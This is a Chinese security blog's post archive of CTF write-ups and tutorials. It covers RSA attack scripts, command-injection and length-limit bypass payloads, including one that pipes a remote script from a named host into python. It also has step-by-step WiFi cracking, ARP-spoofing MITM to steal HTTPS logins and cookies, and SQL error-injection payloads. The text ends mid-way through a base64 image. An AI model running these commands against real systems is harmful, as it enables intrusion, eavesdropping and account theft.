效果这里介绍Coppersmith partial information attack这种算法的sage代码的payload，如下：1234567891011121314151617181920p4 = 0xf3a5f928e11c5901f9f4289e513f046748efb99d4f8e706e207a943e1d2c9df43feab38e20c2106d87167e5501ac41adfc4912732457103a4359e5b433da78f39ad6f206b8f170192aa0841feb501ce1n = 0x7e7007c7c85788b9b77cda64c9b3f5d2a795fe1b1f8d3f120288a30a168c3ea932c7574700ff0f596c5ad04a703756aedc66b9b9e44911d55f0a72a1cc1a569cee02a84499cdb091b8471a8e6cc0ebca583dfd6fb8d5fecf32ff67d2ddeaaaaf9c71a10009b4218fc57743675f283d22734ac7ade2ca240772d11b5783755378f7c30988f41d4a9d62561ea6e5f2f21d3d44e8689e781d3f61356123929457d17b07a1d04741bf970afb590cd820dd12cf88f68b0e896388f433fd2adf3354353c9c56abb0cfea223387e6d0b2df10e450c621ac153e47369f888fdc0b39c842a5ddc6a11339862ccdb4be97a81445205fb8f8bde9daaad5d0dc2ea5bd3b8c43pbits = 1024kbits = pbits - p4.nbits()print p4.nbits()p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4x0 = f.small_roots(X=2^kbits, beta=0.4)[0]print &quot;x: %s&quot; %hex(int(x0))p = p4+x0print &quot;p: &quot;, hex(int(p))assert n % p == 0q = n/int(p)print &quot;q: &quot;, hex(int(q)) 就是已知rsa算法中的p的高位p4，然后可以分解出p，q运行结果如下：]]></content>
  </entry>
  <entry>
    <title><![CDATA[CTF中RSA套路]]></title>
    <url>%2F2017%2F11%2F14%2FCTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[以前一直用的是http://bobao.360.cn/learning/detail/3058.html这里的，可是发现这里面好久没更新了，想了想还是自己在整理一下吧。 具体RSA加解密算法就不介绍了，先看数据提取吧。 需要注意的是，代码中很多地方用到了gmpy2库，安装方法参考https://www.cnblogs.com/pcat/p/5746821.html 数据提取一般来说，RSA基本围绕着c,m,e,d,p,q,n这几个参数展开，但是题目一般不会直接给参数，需要我们自己手工提取。 pem文件：针对这类文件可以直接使用openssl提取，大概使用过的方式有： 12openssl rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.encopenssl rsa -pubin -text -modulus -in warmup -in public.pem pcap文件：针对这类文件可以使用wireshake follow一下。这种问题一般都是写了一个交互式crypto系统，可能产生多轮交互 ppc模式：这种模式是上述pcap文件的交互版，会给一个端口进行一些crypto的交互，参数会在交互中给出。 模数分解已知e,p,q求d1d = gmpy2.invert(e, (p-1)*(q-1)) 已知e,d,n求p,q12345678910111213141516171819202122232425262728293031323334353637import random def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return a def getpq(n,e,d): p = 1 q = 1 while p==1 and q==1: k = d * e - 1 g = random.randint ( 0 , n ) while p==1 and q==1 and k % 2 == 0: k /= 2 y = pow(g,k,n) if y!=1 and gcd(y-1,n)&gt;1: p = gcd(y-1,n) q = n/p return p,q def main(): n = 0xa66791dc6988168de7ab77419bb7fb0c001c62710270075142942e19a8d8c51d053b3e3782a1de5dc5af4ebe99468170114a1dfe67cdc9a9af55d655620bbab e = 0x10001 d = 0x123c5b61ba36edb1d3679904199a89ea80c09b9122e1400c09adcf7784676d01d23356a7d44d6bd8bd50e94bfc723fa87d8862b75177691c11d757692df8881 p,q = getpq(n,e,d) print &quot;p: &quot;+hex(p) print &quot;q: &quot;+hex(q) if __name__ == &apos;__main__&apos;: main() 在线分解nhttp://factordb.com通过在此类网站上查询n，如果可以分解或者之前分解成功过，那么可以直接得到p和q yafu分解n直接打开程序，然后输入factor($n)，$n为模数，此方法比上面的在线要好用很多 公约数分解n识别此类题目，通常会发现题目给了多个n，均不相同，并且都是2048bit，4096bit级别，无法正面硬杠，并且明文都没什么联系，e也一般取65537。可以直接gcd(n1,n2)求出一个因数。如下:12n1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743 可以直接用公约数分解n，求得p,q1234567891011121314def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return an1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743print &quot;p: &quot;+str(gcd(n1,n2))print &quot;q1: &quot;+str(n1/gcd(n1,n2))print &quot;q2: &quot;+str(n2/gcd(n1,n2)) 低加密指数攻击e=3时的小明文攻击当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。如果明文的三次方虽然比n大，但是大不了多少，则可以爆破。如下代码:123456i=0 while 1: if(gmpy2.root(c+i*N, 3)[1]==1): print gmpy2.root(c+i*N, 3) break i=i+1 低加密指数广播攻击如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。这个识别起来比较简单，一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。 低解密指数攻击识别：e看起来特别大就行了github上有开源的攻击代码https://github.com/pablocelayes/rsa-wiener-attack这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上：12import syssys.setrecursionlimit(10000000) 共模攻击识别：若干次加密，e不同，n相同，m相同。就可以在不分解n和求d的前提下，解出明文m。已知e1,e2,n,c1,c212345678910111213141516171819202122232425def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(&apos;modular inverse does not exist&apos;) else: return x % ms = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = modinv(c1, n)elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n)m=(pow(c1,s1,n)*pow(c2,s2,n)) % nprint &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;) 已知dp,dq求解其实这种方法很简单，但是由于我当时做的时候查了好久dp,dq是什么，所以还是记录下来扫个坑吧。这种参数是为了让解密的时候更快速产生的，其中:12dp=d%(p-1)dq=d%(q-1) 解密全部代码如下:12345InvQ=gmpy2.invert(q,p)mp=pow(c,dp,p)mq=pow(c,dq,q)m=(((mp-mq)*InvQ)%p)*q+mqprint &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;) 隐藏小私有指数δ的RSA后门密钥生成算法以下题目来自于hctf2016http://0x48.pw/2016/11/28/0x28/https://github.com/Hcamael/ctf-library/tree/master/RSA1https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa1_payload.py算法原理如下：攻击方法也很简单 解题关键是在下图根据rsa-wiener-attack我们可以知道，在rsa算法中，如果密钥d特别小，则我们可以根据e,n直接求出d，所以上图满足条件。 而当我们求出了那两个东西(原谅我打不出来…),则和已知e,d,n求p,q的情况一样了，当p,q已知的时候就可以解出d了 基于隐藏素数因子的RSA-HPβ算法(高比特位已知分解)以下题目来自于hctf2016https://github.com/Hcamael/ctf-library/tree/master/RSA2payload:12https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.pyhttps://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.sage 该后门算法依赖于Coppersmith partial information attack算法, sage实现该算法，sage安装详细看我的另一篇关于sage的安装。 Coppersmith partial information attack算法可以理解成，当我们已知素数p或者q的前一定位数，可以根据这个算法还原完整的p，q。算法实现代码：https://github.com/Gao-Chuan/RSA-and-LLL-attacks 例题如下： 仔细观察算法，n是靠t,u,r来拼接成，而u是根据p的前5k/16位进行des转置得到的，所以当我们已知n的前提下，相当于我们已知p的前5k/16位。这就是我们利用的点。如下图： 利用代码如下:1234567891011121314151617181920p4 = 0xf3a5f928e11c5901f9f4289e513f046748efb99d4f8e706e207a943e1d2c9df43feab38e20c2106d87167e5501ac41adfc4912732457103a4359e5b433da78f39ad6f206b8f170192aa0841feb501ce1n = 0x7e7007c7c85788b9b77cda64c9b3f5d2a795fe1b1f8d3f120288a30a168c3ea932c7574700ff0f596c5ad04a703756aedc66b9b9e44911d55f0a72a1cc1a569cee02a84499cdb091b8471a8e6cc0ebca583dfd6fb8d5fecf32ff67d2ddeaaaaf9c71a10009b4218fc57743675f283d22734ac7ade2ca240772d11b5783755378f7c30988f41d4a9d62561ea6e5f2f21d3d44e8689e781d3f61356123929457d17b07a1d04741bf970afb590cd820dd12cf88f68b0e896388f433fd2adf3354353c9c56abb0cfea223387e6d0b2df10e450c621ac153e47369f888fdc0b39c842a5ddc6a11339862ccdb4be97a81445205fb8f8bde9daaad5d0dc2ea5bd3b8c43pbits = 1024kbits = pbits - p4.nbits()print p4.nbits()p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4x0 = f.small_roots(X=2^kbits, beta=0.4)[0]print &quot;x: %s&quot; %hex(int(x0))p = p4+x0print &quot;p: &quot;, hex(int(p))assert n % p == 0q = n/int(p)print &quot;q: &quot;, hex(int(q))]]></content>
  </entry>
  <entry>
    <title><![CDATA[GET的命令执行漏洞]]></title>
    <url>%2F2017%2F11%2F14%2FGET%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[源于hitcon中的题目ssrfme的wp,然后去搜了下这个漏洞,做个简单的记录吧。https://lorexxar.cn/2017/11/10/hitcon2017-writeup/#sql-so-hard 首先要先知道perl的open可以执行命令，如下： 而在GET命令中存在open函数123file.pm84: opendir(D, $path) or132: open(F, $path) or return new 同时open函数还支持file协议1234567891011121314root@iZ285ei82c1Z:~/test# cat /usr/share/perl5/LWP.pm...=head2 File RequestThe library supports GET and HEAD methods for file requests. The&quot;If-Modified-Since&quot; header is supported. All other headers areignored. The I&lt;host&gt; component of the file URL must be empty or setto &quot;localhost&quot;. Any other I&lt;host&gt; value will be treated as an error.Directories are always converted to an HTML document. For normalfiles, the &quot;Content-Type&quot; and &quot;Content-Encoding&quot; in the response areguessed based on the file suffix.Example: $req = HTTP::Request-&gt;new(GET =&gt; &apos;file:/etc/passwd&apos;);... 但是很尴尬的是，接下来的复现失败了，只能copy@LoRexxar师傅的了。我们可以测试一下12root@iZ285ei82c1Z:~/test# GET &apos;file:id|&apos;uid=0(root) gid=0(root) groups=0(root) 发现成功执行了命令，payload来自rr的博客123http://13.115.136.15/?url=file:bash%20-c%20/readflag|&amp;filename=bash%20-c%20/readflag|http://13.115.136.15/?url=file:bash%20-c%20/readflag|&amp;filename=bash%20-c%20/readflag|http://13.115.136.15/sandbox/c36eb1c4372f5f8131542751d486cebd/bash%20-c%20/readflag%7C]]></content>
  </entry>
  <entry>
    <title><![CDATA[ctf命令执行与绕过]]></title>
    <url>%2F2017%2F11%2F13%2Fctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[(写完之后没保存又要重新再敲一遍，好气)源于lemon师傅，然后又参考了pupile师傅的文章，’偷’点干货来。 空格绕过&lt; 符号 $IFS$9 符号 ${IFS} 符号这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，加一个{}就固定了变量名，同理在后面加个$可以起到截断作用。 命令分隔符%0a 符号换行符%0d 符号回车符; 符号表示连续指令&amp; 符号表示将前一个命令设置进入后台| 符号管道符，将前一个命令的输出作为后一个命令的输入&amp;&amp; 符号前一个命令执行成功才会执行下一条命令|| 符号前一个命令执行失败才会执行下一条命令 黑名单绕过a=l;b=s;$a$b base64编码 短命令执行这个技巧一开始看到的是p神的七字命令执行，觉得好牛逼。然后最近hitcon的orange出了题五字和四字的，觉得在风中凌乱了… 大体上的想法就是通过重命名文件绕过，然后通过ls来将文件名写入到文件中，可以看到&gt;这个重定向符号可以来创建文件，其中文件名是&gt;后面跟的参数，然后创建出我们精心构造好的多个文件名，然后通过ls打印出来再重定向&gt;到一个木马文件中，就可以执行了。 拼接方法讲题目之前先介绍两种拼接方法： 一个反斜杠\，这种方法是将一次输入分成多出输入，以\换下一次，以p结束。这种方法的话创建的文件名是按照我们的输入正常排列好的，所以我们不需要添加-t来重新排序，如下面的七字绕过实例。 两个反斜杠\\，这种方法是利用\来拼接字符串，其中前一个\是用来反义后一个\的。这种方法的话需要精心构造输入，利用倒叙来输入，然后ls的时候需要加-t参数来排列一下，如下图以及五字四字绕过，虽然报错了但是也执行成功了。 七字绕过代码如下：12345&lt;?phpif(strlen($_GET[1])&lt;8)&#123; echo shell_exec($_GET[1]);&#125;?&gt; 很简单的代码，绕过长度限制就可以执行任意命令,利用代码如下:1234567891&gt;wget\&gt;域名.\&gt;com\&gt;-O\&gt;she\&gt;ll.p\&gt;pls&gt;ash a 上面的代码其实是在目标服务器创建个文件名为a的文件，内容为’wget 域名.com -O shell.pp’代码含义就是去执行我们自己的vps上的一个木马文件 这里有一点特别值得注意的。这里注意.不能作为文件名的开头，因为linux下.是隐藏文件的开头，ls列不出来 五字绕过源代码如下:12345678910&lt;?php $sandbox = &apos;/www/sandbox/&apos; . md5(&quot;orange&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET[&apos;cmd&apos;]) &amp;&amp; strlen($_GET[&apos;cmd&apos;]) &lt;= 5) &#123; @exec($_GET[&apos;cmd&apos;]); &#125; else if (isset($_GET[&apos;reset&apos;])) &#123; @exec(&apos;/bin/rm -rf &apos; . $sandbox); &#125; highlight_file(__FILE__); 观察可得，每个用户的操作目录独立，而且可以执行长度小于等于5的命令，那么不用担心别人文件干扰。唯一值得注意的是因为长度要小于5，所以我们无法执行ls -t&gt;a接下来看一下orange的官方wp：123456789101112131415161718192021222324252627282930313233343536import requestsfrom time import sleepfrom urllib import quotepayload = [ # generate `ls -t&gt;g` file &apos;&gt;ls\\&apos;, &apos;ls&gt;_&apos;, &apos;&gt;\ \\&apos;, &apos;&gt;-t\\&apos;, &apos;&gt;\&gt;g&apos;, &apos;ls&gt;&gt;_&apos;, # generate `curl orange.tw.tw&gt;python` # curl shell.0xb.pw|python &apos;&gt;on&apos;, &apos;&gt;th\\&apos;, &apos;&gt;py\\&apos;, &apos;&gt;\|\\&apos;, &apos;&gt;pw\\&apos;, &apos;&gt;x.\\&apos;, &apos;&gt;xx\\&apos;, &apos;&gt;l.\\&apos;, &apos;&gt;el\\&apos;, &apos;&gt;sh\\&apos;, &apos;&gt;\ \\&apos;, &apos;&gt;rl\\&apos;, &apos;&gt;cu\\&apos;, # exec &apos;sh _&apos;, &apos;sh g&apos;, ]r = requests.get(&apos;http://xxx/web1.php/?reset=1&apos;)for i in payload: assert len(i) &lt;= 5 r = requests.get(&apos;http://xxx/web1.php/?cmd=&apos; + quote(i) ) print i sleep(0.2) 注意看123456&gt;ls\\ls&gt;_&gt;\ \\&gt;-t\\&gt;\&gt;gls&gt;&gt;_ 这几行代码，因为我们提到不能用ls -t&gt;g来排序，所以我们需要用合理的分割方式和预写入来控制写入文件的内容 四字绕过代码如下：12345678910&lt;?php $sandbox = &apos;/www/sandbox/&apos; . md5(&quot;orange&quot; . $_SERVER[&apos;REMOTE_ADDR&apos;]); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET[&apos;cmd&apos;]) &amp;&amp; strlen($_GET[&apos;cmd&apos;]) &lt;= 4) &#123; @exec($_GET[&apos;cmd&apos;]); &#125; else if (isset($_GET[&apos;reset&apos;])) &#123; @exec(&apos;/bin/rm -rf &apos; . $sandbox); &#125; highlight_file(__FILE__); 这题就是大佬们自己嗨了…最大的问题还是ls -t&gt;g这个问题，所以如果我们构造成ls -th&gt;g，然后逆序分割：1234dirslg\&gt;ht- 然后逆序输出到文件 这里就可以看出为什么构造ls -th&gt;g，因为这个时候可以看到目录遍历的时候，ht-跑到了g&gt;后面(大佬就是会牛逼…)，这时候完美的构造出了我们需要的命令，后面命令基本不变。 后面如果有别的继续补充吧…]]></content>
  </entry>
  <entry>
    <title><![CDATA[无线破解浅谈]]></title>
    <url>%2F2017%2F11%2F09%2F%E6%97%A0%E7%BA%BF%E7%A0%B4%E8%A7%A3%E6%B5%85%E8%B0%88%2F</url>
    <content type="text"><![CDATA[有幸给学弟学妹们上了一次课，记录一下学习过程以及把ppt转化成blog吧。 破解原理无线网络中信号不会定向的传给每个设备，就是说AP发射的信号每个网卡都能够接收到，但是在正常情况下只有是自己的数据包才会接受，但是如果我们改一下网卡的模式，就能够让它接收周围所有的无线数据包，所以，没有加密的无线是毫无安全性可言的，因为任何在范围内的设备都能获取到包的内容，如果使用加密的无线，即使获取到也只是加密后的数据。然后现在连无线大致就是两种：123456789101112（1） 客户端：我是自己人，要连接你服务端：好的，那你连吧|骗我呢，不准连（2） 客户端：我是自己人，要连接你服务端：我不信，自己人都有密码，你把密码发给我看看客户端：好吧，密码是12345678黑客：得到密码啦可能么？在认证时候是信息都是明文传输的，如果直接传密码都能够得到，其实是客户端：我是自己人，要连接你服务端：我不信，自己人都有密码，你用密码把45212345这个给我加密了客户端：好的，加密后的密文是453154312服务端：用密码解密后，还是45212345就允许连接，否则不允许 然后现在的加密就是WEP，WPA，WPA2等等，下面分别介绍：1234WEP，它使用RC4加密，加密数据用的密码是“WiFi的密码+iv”，iv是随机生成的，对方不知道，所以需要通过明文发送，因为iv只有200多种，而加密用的iv可以直接读到，所以如果收到的大量的数据包就会有使用了重复iv的数据包（大于254就绝对会有重复的），那么用那两个加密的数据包去异或就会得到明文的异或。。。最终就能得到密码，所以WEP加密绝对能够被破解。WPA，就是针对WEP缺点的改进。使用了更加好的加密算法，iv的取值也变成很多，很难得到重复的，加密数据的密码是“WiFi密码+WiFi名字+其他”，他只能用暴力破解，而且不能跑彩虹表（因为这里面有WiFi名称这个元素），如果你确定目标永远不会改WiFi名称，其实也是可以自己根据名称生成彩虹表来跑的。它有两种，要么使用认证服务器（安全性高，企业用）要么使用预共享秘钥（安全性相对较低，家庭等使用），我们一般也是使用psk这种。WPA2，就是wpa的升级版，加密算法使用了更好的。WPS，应该是配合前面的加密吧。为了解决前面使用认证复杂而产生的。分两种验证方式，要么使用pin码，就是自己的客户端生成一个pin码，在路由器端输入这个pin码就可以完成认证，还有就是使用按钮，例如手机上点一下那个按钮，然后在路由器上也按一下，就能完成认证。不过它的pin码设计上有缺陷，只要尝试1万多次就能得到，然后通过pin能得到WiFi密码。 现在来看看抓包的样子：开启网卡的混杂模式（监听模式）后抓包看到抓到的包都是802.11协议的包，这是因为周围的无线都是加密的，我开了个没加密的，就可以看到协议变了，也能够看到内容了如果是wep，wpa/psk加密，如果有密码还可以直接使用它解包看内容 WEP本实验需要外接一个无线网卡 1.关闭网络管理以及可能会干扰airmon-ng工作的进程12service network-manager stopairmon-ng cherk kill 2.查看要监听的无线网卡1airmon-ng 我们选择监听wlan0网卡 3.开始监听1airmon-ng start wlan0 4.查看周围无线设备1airodump-ng wlan0mon 如果抓到了密钥流信息，第一个红色箭头会有信息显示 5.针对特定ap进行监听1airodump-ng wlan0mon --bssid AP_Mac -c [AP_channel] -w [result_file] 6.因为密钥信息会在连接刚开始验证的时候交换，所以对某个已经连接的客户端实施断开连接打击，直到抓到密钥流1aireplay-ng -0 2 -a [AP_Mac] -c [Client_Mac] wlan0mon -0表示deaulth攻击，可以把已经连接好的客户端断开，2表示攻击两次 可以看到已经抓到了密钥流，此时会在目录下生成一个*.xor文件 7.通过密钥文件与ap建立关联关系1aireplay-ng -1 60 -e [essid] -y wep*.xor -a [AP_Mac] -h [Wlan0mon_Mac] wlan0mon 此处-h后面参数跟wlan0mon的mac前6串即可 8.通过arp重放，来抓到更多的信息1aireplay-ng -3 -b [AP_mac] -h [wlan0mon-mac] wlan0mon 可以发现监听窗口里data值越来越多(这个越多，破解速度越快，难度越低) 9.差不多了就可以开始破解了1aircrack-ng wep*.cap WPA目前WPA只能靠暴力跑字典来破解，但是效率又很低下。所以不一定能破解出来，虽说WPA2已经有了密钥重装攻击，但是感觉这个协议还是很安全的。步骤与破解WEP差不多，只不过不需要第7,8两步，这里就不重复写了。 钓鱼wifiwifi-pumpkin邪恶双子星，逼格很高的名字，通俗的说就是钓鱼WiFi。配置方法超级多，今天说下最简单的之一吧。装备就是要两张网卡，虚拟机可以虚拟一张，无线网卡需要自配。安装方法，输入以下命令12341. git clone https://github.com/P0cL4bs/WiFi-Pumpkin.git2.cd WiFi-Pumpkin3.chmod +x installer.sh4../installer.sh –install 安装好了之后在目录下运行1./wifi-Pumpkin.py 目前该工具还刚开始玩，有很多功能并不熟悉，只能结束一下最简单的功能，以后再继续补充。 setting页面只需要简单配置一下ssid，信道的话随便填，之后就可以start了。 目前主要用的两个地方：1.Driftnet功能主要用来查看监听的流量中的图片 2.Activity-Monitor模块主要用来查看监听流量的请求信息 中间人攻击arp欺骗原理如下图： 内网断网攻击123第一步：查找目标IP地址 fping -asg 192.168.1.0/24第二步：查看网关ip route -n第三步：断网攻击：arpspoof -i 网卡 -t 受害者IP 网关IP 主要是使用arpsoof工具实现欺骗和截断 截取照片123第一步：开启IP流量转发 echo 1 &gt; /proc/sys/net/ipv4/ip_forward第二步：ARP欺骗： arpspoof -i 网卡 网关IP 受害者IP第三步：抓取图片：driftnet -i 网卡 如果不开启ip流量转发，那么和断网攻击效果一样。用到的工具除了arpspoof，还有driftnet工具，主要用来抓取图片的，上面钓鱼wifi里有讲到这个工具 截取https账号12345第一步：配置文件：vim /etc/ettercap/etter.conf 删除Linux最后两段前的#号第二步：过滤数据包：iptables -t nat -A PREROUTING -p tcp -i eth0 --destination-port 80 -j REDIRECT --to-port 10000第三步：ARP欺骗：arpspoof -i 网卡 网关ip 受害者ip 第四步：扒皮：sslstrip -a -f -k 或 sslstrip -l 10000第五步：开始嗅探：ettercap -Tq -i 网卡 主要用到了sslstrip工具用来脱ssl层,以及用ettercap工具来嗅探账号密码 截取cookie1234567第一步：开启IP转发：echo 1 &gt; /proc/sys/net/ipv4/ip_forward第二步：ARP欺骗： arpspoof -i 网卡 网关IP 受害者IP第三步：抓包：wireshark 或者 tcpdump -i eth0 -w cookie.cap第四部：等待受害人登陆第五部：处理抓取的数据包：ferret -r cookie.cap第六步：开启hamster服务：hamster第七步：设置代理：127.0.0.1:1234 主要其实还是找到对方的登陆cookie来替换自己的，从而获得权限]]></content>
  </entry>
  <entry>
    <title><![CDATA[浅谈php安全]]></title>
    <url>%2F2017%2F11%2F07%2F%E6%B5%85%E8%B0%88php%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[最近在看p神的blog，觉得大佬就是大佬。今天看到这篇觉得有很多需要学习的地方，又不好意思偷，就只能直接贴链接了。http://www.freebuf.com/articles/web/38383.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[mysql显错注入]]></title>
    <url>%2F2017%2F10%2F31%2Fupdatexml-mysql%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[整理一下那些报错注入的函数吧 报错注入的前提条件：12一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解 updatexmlupdatexml(xml_document,xpath_string,new_value);第一个参数:xml_documnet是String格式，为XML文档对象的名称，文中为Doc。第二个参数:xpath_string(xpath格式的字符串),如果不了解xpath语法,可以在网上查找教程。第三个参数:new_value,string格式,替换查找到的符合条件的数据。 然后咋们再看看语句:1http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) concat(str1,str2,...)返回结果为连接参数产生的字符串。如有任何一个参数为null，则返回值为null。 通过查询@@version,返回版本。然后concat将其字符串化。因为updatexml第二个参数需要xpath格式的字符串,所以不符合要求，然后报错。 错误大概会是:1ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’ floor利用方式：1234count(*)、rand()、group by三者缺一不可报错注入用一个公式，只要套用公式即可，公式如下:?id=2&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a)--+ 公式解析：12345678floor()是取整数rand()在0和1之间产生一个随机数rand(0)*2将取0到2的随机数floor(rand()*2)有两条记录就会报错floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的count(*)是用来统计结果的，相当于刷新一次结果group by在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话count(*)加1在使用group by时floor(rand(0)*2)会被执行一次，若虚表不存在记录，插入虚表时会再执行一次 如下：1id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a) extractvalue1id = 1 and (extractvalue(1, concat(0x5c,(select user())))) exp1id =1 and EXP(~(SELECT * from(select user())a)) 其他1234567891011121314151617GeometryCollection()id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))polygon()id =1 AND polygon((select * from(select * from(select user())a)b))multipoint()id = 1 AND multipoint((select * from(select * from(select user())a)b))multilinestring()id = 1 AND multilinestring((select * from(select * from(select user())a)b))linestring()id = 1 AND LINESTRING((select * from(select * from(select user())a)b))multipolygon()id =1 AND multipolygon((select * from(select * from(select user())a)b))]]></content>
  </entry>
  <entry>
    <title><![CDATA[typecho backdoor]]></title>
    <url>%2F2017%2F10%2F26%2Ftypecho-backdoor%2F</url>
    <content type="text"><![CDATA[听说typecho博客留了后门，上课的时候试了一下]]></content>
  </entry>
  <entry>
    <title><![CDATA[问鼎杯决赛]]></title>
    <url>%2F2017%2F09%2F24%2F%E9%97%AE%E9%BC%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[决赛去水了一把 3-1 合格铲屎官下载下来一张图片，用神奇stegsolve打开,随便按发现通道最低位有点奇怪，先用lsb提取一下。发现熟悉的pk，save bin为一个zip文件，打开后发现是一串base64加密后的字符串，先解码看一下是什么东西发现是png文件头，直接写脚本提取一下123456import base64f=open(&apos;flag.png&apos;,&apos;wb&apos;)a=&apos;&apos;&apos;iVBORw0KGgoAAAANSUhEUgAAAPoAAAD6CAYAAACI7Fo9AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAVqSURBVHhe7d1bTuRGAEDRIftfK1tIxgNRJNINbpff9xzJmvlpP6q5KpeB5u3v334Bt/bX57/AjQkdAoQOAUKHAKFDgNAhQOgQIHQIEDoECB0ChA4BQocLe39///zf9/xSCwSY0SFA6BAgdAgQOgQIHQKEDgGLv7329vb2+b/1PDqVZ8dZ67uCe13HV1sc95GRcRo9x7XeI8aZ0SFA6BAgdAgQOgR4GLdw/99d/5xz2/q61jD6Hp/pWuo2CX3NN3jrIJbuf/T6t76uNVzhHJnHrTsECB0ChM6fW/RHG/chdAgQOgQIHQJO8330Z6fx7DhrfYtni7XonHPb+rpe8eoYHHGOjDGjX9AU5twNJkLnzwz9aOM+hA4BQocAoUOA0CHAb68N7P+o1z7zaJ9r72+y1tizHzM6BAgdAoQOAZddo8/107mMrEO3eO3aRt6Lrcee/ZjRIUDoECB0CBA6BAgdAhY/dQeuw4wOAUKHAKFDgNAhQOgQIHQIEDoECB0ChA4BQocAoUOA0CFA6BAgdAgQOgQIHQKEDgFChwAfJcVDI3+cgvMZCv3RF8PaXwhb/7WQO/81kpFY5772u/E789jUuHWHAKFDgNAhQOgQcMmHcWseY/Sh09rXexaj4zK569hckRmdIVPMzzbOQ+gQIHQIEPqNTevnRxs9t/7JuDnnssUX/lnWp8+ubY9xOcsY8MGMDgFChwChQ4DQIeD0D+PmWnouIw+sJmcag69Gr22uM48BH8zoECB0CBA6BKy+Rp/rLOvEkWt45izr09E1+lbv75L9nmVMr+rUoY9GuMcxHnllSJcef+Ta5p7fVu/vkv2+Mqb8n1t3CBA6BAgdAoTO7qb19qsbY4YexgHXYEaHAKFDgNAhQOgQIHQIEDoECB0ChA4BQocAoUOA0CFA6BAgdAgQOgT4NdWTOeoz7I46Lvswo0OA0CFA6BBw6jX62uvGK6wZrdHZwmF/wGHy06GFvo451/3suCPv0RXGu0LoJ3NUOEK/N2t0CBA6BAgdAlZfo6+5LhvZ/9bntpWj1rzPjvvTMY86X15jRocAoUOAW/eT+e5WeImR8Rp1hfGuMKNDwOqhTzPDnA3YjxkdAoQOAUKHAKFDwC6/j/7o4ducwy593WTktUf67kHlluf/7LhL36fJFca7wowOAUKHAKFDwOVCn9aDczbgP4sfxo3GNPKQZ6mfjrnW8UYeQu19zf96dtyR92lkHFiXW3cIEDoECB0ChA4Bu/xk3